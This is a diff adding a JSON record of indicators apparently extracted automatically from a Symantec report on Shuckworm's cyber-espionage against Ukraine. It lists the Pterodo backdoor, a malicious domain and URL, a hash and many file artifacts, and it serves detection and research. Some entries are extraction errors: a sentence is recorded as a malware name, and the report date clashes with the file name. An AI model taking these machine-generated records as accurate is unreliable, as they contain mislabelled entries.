@@ -1,0 +1,3048 @@
+{
+  "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+  "title": "Shuckworm Continues Cyber-Espionage Attacks Against Ukraine",
+  "source": null,
+  "published_date": "July 14, 2021",
+  "report_metadata": {
+    "file_name": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022).pdf",
+    "file_path": "/root/APTtext/Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022).pdf",
+    "source_type": "pdf",
+    "char_length": 14071,
+    "report_profile": "narrative_cti"
+  },
+  "entities": [
+    {
+      "id": "ent_malware_Pteranodon",
+      "type": "Malware",
+      "name": "Pteranodon",
+      "normalized_name": "Pteranodon",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_3"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "family": "Pteranodon",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_3",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_malware_Pterodo",
+      "type": "Malware",
+      "name": "Pterodo",
+      "normalized_name": "Pterodo",
+      "aliases": [
+        "backdoor leveraged by Shuckworm"
+      ],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_13",
+        "ev_17",
+        "ev_3",
+        "ev_6"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "family": "Pterodo",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_17",
+      "supporting_evidence_ids": [
+        "ev_3",
+        "ev_6",
+        "ev_13"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    }
+  ],
+  "observations": [
+    {
+      "id": "ent_malware_backdoor_leveraged_by_Shuckworm",
+      "type": "Malware",
+      "name": "backdoor leveraged by Shuckworm",
+      "normalized_name": "backdoor leveraged by Shuckworm",
+      "aliases": [],
+      "confidence": 0.8300000000000001,
+      "evidence_ids": [
+        "ev_13",
+        "ev_17",
+        "ev_3"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_malware_Pterodo"
+    },
+    {
+      "id": "ent_malware_This_file_is_a_known_custom_backdoor_leveraged_by_Shuckworm",
+      "type": "Malware",
+      "name": "This file is a known custom backdoor leveraged by Shuckworm",
+      "normalized_name": "This file is a known custom backdoor leveraged by Shuckworm",
+      "aliases": [
+        "Pterodo"
+      ],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_13",
+        "ev_17",
+        "ev_3",
+        "ev_6"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "family": "This file is a known custom backdoor leveraged by Shuckworm",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_6",
+      "supporting_evidence_ids": [
+        "ev_17",
+        "ev_3",
+        "ev_13"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_tool_deep-green",
+      "type": "Tool",
+      "name": "deep-green",
+      "normalized_name": "deep-green",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_33",
+        "ev_34"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_33",
+      "supporting_evidence_ids": [
+        "ev_34"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "tool_name": "deep-green",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_domain_plazma.viber.ontroma.ru",
+      "type": "Domain",
+      "name": "plazma.viber.ontroma.ru",
+      "normalized_name": "plazma.viber.ontroma.ru",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_95"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "value": "plazma.viber.ontroma.ru",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_95",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_http_PLAZMA.VIBER.ontroma.ru_PLAZMA.html",
+      "type": "URL",
+      "name": "http://PLAZMA.VIBER.ontroma.ru/PLAZMA.html",
+      "normalized_name": "http://PLAZMA.VIBER.ontroma.ru/PLAZMA.html",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_95"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "value": "http://PLAZMA.VIBER.ontroma.ru/PLAZMA.html",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_95",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_ioc_sha256_d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7",
+      "type": "SHA256",
+      "name": "d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7",
+      "normalized_name": "d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_92"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "value": "d15a7e69769f4727f7b522995a17a0206ac9450cfb0dfe1fc98fd32272ee5ba7",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_92",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_file_baby.cmd",
+      "type": "File",
+      "name": "baby.cmd",
+      "normalized_name": "baby.cmd",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_29",
+        "ev_72",
+        "ev_75"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "baby.cmd",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_75",
+      "supporting_evidence_ids": [
+        "ev_29",
+        "ev_72"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "malicious_component",
+      "family_hints": [
+        "APPDATA"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_baby.dat",
+      "type": "File",
+      "name": "baby.dat",
+      "normalized_name": "baby.dat",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_29",
+        "ev_72",
+        "ev_73",
+        "ev_75"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "baby.dat",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_75",
+      "supporting_evidence_ids": [
+        "ev_29",
+        "ev_72",
+        "ev_73"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "config_or_data",
+      "family_hints": [
+        "APPDATA",
+        "MINUTE"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_backed.exe",
+      "type": "File",
+      "name": "backed.exe",
+      "normalized_name": "backed.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_30",
+        "ev_31",
+        "ev_76",
+        "ev_77"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "backed.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_76",
+      "supporting_evidence_ids": [
+        "ev_77",
+        "ev_30",
+        "ev_31"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "malicious_component",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_basement.exe",
+      "type": "File",
+      "name": "basement.exe",
+      "normalized_name": "basement.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_72",
+        "ev_74"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "basement.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_72",
+      "supporting_evidence_ids": [
+        "ev_74"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "APPDATA",
+        "KHTML",
+        "VICTIM_ID"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_battery.dat",
+      "type": "File",
+      "name": "battery.dat",
+      "normalized_name": "battery.dat",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_54"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "battery.dat",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_54",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "config_or_data",
+      "family_hints": [
+        "CSIDL_SYSTEM",
+        "CSIDL_PROFILE",
+        "CSIDL_COMMON_MUSIC",
+        "MINUTE"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_cmd.exe",
+      "type": "File",
+      "name": "cmd.exe",
+      "normalized_name": "cmd.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_51",
+        "ev_54",
+        "ev_56",
+        "ev_57"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "cmd.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_51",
+      "supporting_evidence_ids": [
+        "ev_54",
+        "ev_56",
+        "ev_57"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "abused_legitimate_file",
+      "is_likely_legitimate": true,
+      "family_hints": [
+        "CSIDL_SYSTEM",
+        "FILM",
+        "REDACTED",
+        "CSIDL_PROFILE"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_deceive.exe",
+      "type": "File",
+      "name": "deceive.exe",
+      "normalized_name": "deceive.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_39",
+        "ev_97"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "deceive.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_97",
+      "supporting_evidence_ids": [
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_deception.exe",
+      "type": "File",
+      "name": "deception.exe",
+      "normalized_name": "deception.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_39",
+        "ev_97"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "deception.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_97",
+      "supporting_evidence_ids": [
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_deceptive.exe",
+      "type": "File",
+      "name": "deceptive.exe",
+      "normalized_name": "deceptive.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_39",
+        "ev_97"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "deceptive.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_97",
+      "supporting_evidence_ids": [
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_decide.exe",
+      "type": "File",
+      "name": "decide.exe",
+      "normalized_name": "decide.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_39",
+        "ev_97"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "decide.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_97",
+      "supporting_evidence_ids": [
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_decipher.exe",
+      "type": "File",
+      "name": "decipher.exe",
+      "normalized_name": "decipher.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_39",
+        "ev_97"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "decipher.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_97",
+      "supporting_evidence_ids": [
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_decisive.exe",
+      "type": "File",
+      "name": "decisive.exe",
+      "normalized_name": "decisive.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_39",
+        "ev_97"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "decisive.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_97",
+      "supporting_evidence_ids": [
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_deep-green.exe",
+      "type": "File",
+      "name": "deep-green.exe",
+      "normalized_name": "deep-green.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_33",
+        "ev_83",
+        "ev_90",
+        "ev_91"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "deep-green.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_83",
+      "supporting_evidence_ids": [
+        "ev_33",
+        "ev_90",
+        "ev_91"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "PUBLIC"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_deep-sunken.exe",
+      "type": "File",
+      "name": "deep-sunken.exe",
+      "normalized_name": "deep-sunken.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_69",
+        "ev_70",
+        "ev_71",
+        "ev_79"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "deep-sunken.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_69",
+      "supporting_evidence_ids": [
+        "ev_79",
+        "ev_70",
+        "ev_71"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "malicious_component",
+      "family_hints": [
+        "HTTP",
+        "POST",
+        "USERPROFILE"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_deep-vaulted.exe",
+      "type": "File",
+      "name": "deep-vaulted.exe",
+      "normalized_name": "deep-vaulted.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_39",
+        "ev_97"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "deep-vaulted.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_97",
+      "supporting_evidence_ids": [
+        "ev_39"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_deep-versed.nls",
+      "type": "File",
+      "name": "deep-versed.nls",
+      "normalized_name": "deep-versed.nls",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_82",
+        "ev_83"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "deep-versed.nls",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_83",
+      "supporting_evidence_ids": [
+        "ev_82"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "config_or_data",
+      "family_hints": [
+        "SCHTASKS",
+        "CREATE",
+        "PUBLIC"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_deerskin.exe",
+      "type": "File",
+      "name": "deerskin.exe",
+      "normalized_name": "deerskin.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_62"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "deerskin.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_62",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_defiant.exe",
+      "type": "File",
+      "name": "defiant.exe",
+      "normalized_name": "defiant.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_32",
+        "ev_80",
+        "ev_81"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "defiant.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_81",
+      "supporting_evidence_ids": [
+        "ev_80",
+        "ev_32"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_depended.exe",
+      "type": "File",
+      "name": "depended.exe",
+      "normalized_name": "depended.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_10",
+        "ev_45",
+        "ev_50",
+        "ev_52"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "depended.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_50",
+      "supporting_evidence_ids": [
+        "ev_45",
+        "ev_10",
+        "ev_52"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "CSIDL_PROFILE",
+        "REDACTED",
+        "HTML"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_descend.exe",
+      "type": "File",
+      "name": "descend.exe",
+      "normalized_name": "descend.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_34",
+        "ev_66",
+        "ev_67",
+        "ev_90"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "descend.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_67",
+      "supporting_evidence_ids": [
+        "ev_66",
+        "ev_90",
+        "ev_34"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_DriversHood.exe",
+      "type": "File",
+      "name": "DriversHood.exe",
+      "normalized_name": "DriversHood.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_64"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "DriversHood.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_64",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "USERPROFILE"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_MediaConvertor.dat",
+      "type": "File",
+      "name": "MediaConvertor.dat",
+      "normalized_name": "MediaConvertor.dat",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_35",
+        "ev_93",
+        "ev_94"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "MediaConvertor.dat",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_94",
+      "supporting_evidence_ids": [
+        "ev_93",
+        "ev_35"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "config_or_data",
+      "family_hints": [
+        "CREATE"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_mshta.exe",
+      "type": "File",
+      "name": "mshta.exe",
+      "normalized_name": "mshta.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_10",
+        "ev_50",
+        "ev_51",
+        "ev_57"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "mshta.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_50",
+      "supporting_evidence_ids": [
+        "ev_10",
+        "ev_51",
+        "ev_57"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "HTML",
+        "CSIDL_SYSTEM",
+        "FILM",
+        "REDACTED"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_ping.exe",
+      "type": "File",
+      "name": "ping.exe",
+      "normalized_name": "ping.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_15",
+        "ev_55"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "ping.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_55",
+      "supporting_evidence_ids": [
+        "ev_15"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_planeta.exe",
+      "type": "File",
+      "name": "planeta.exe",
+      "normalized_name": "planeta.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_18",
+        "ev_58",
+        "ev_60"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "planeta.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_60",
+      "supporting_evidence_ids": [
+        "ev_18",
+        "ev_58"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "CSIDL_COMMON_VIDEO"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_reflect.rar",
+      "type": "File",
+      "name": "reflect.rar",
+      "normalized_name": "reflect.rar",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_47"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "reflect.rar",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_47",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "CSIDL_SYSTEM",
+        "CSIDL_PROFILE"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_schtasks.exe",
+      "type": "File",
+      "name": "schtasks.exe",
+      "normalized_name": "schtasks.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_53",
+        "ev_57"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "schtasks.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_53",
+      "supporting_evidence_ids": [
+        "ev_57"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "family_hints": [
+        "CSIDL_SYSTEM",
+        "CREATE",
+        "CSIDL_COMMON_MUSIC",
+        "CSIDL_COMMON_VIDEO"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_wscript.exe",
+      "type": "File",
+      "name": "wscript.exe",
+      "normalized_name": "wscript.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_44",
+        "ev_47",
+        "ev_48",
+        "ev_49"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "wscript.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_44",
+      "supporting_evidence_ids": [
+        "ev_47",
+        "ev_48",
+        "ev_49"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "CSIDL_PROFILE",
+        "CSIDL_SYSTEM",
+        "SCHTASKS",
+        "CREATE"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_z4z05jn4.egf.exe",
+      "type": "File",
+      "name": "z4z05jn4.egf.exe",
+      "normalized_name": "z4z05jn4.egf.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_32",
+        "ev_78",
+        "ev_79"
+      ],
+      "report_id": "Symantec_Shuckworm-Cyber-Attacks-Ukraine(01-31-2022)",
+      "file_name": "z4z05jn4.egf.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_79",
+      "supporting_evidence_ids": [
+        "ev_78",
+        "ev_32"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
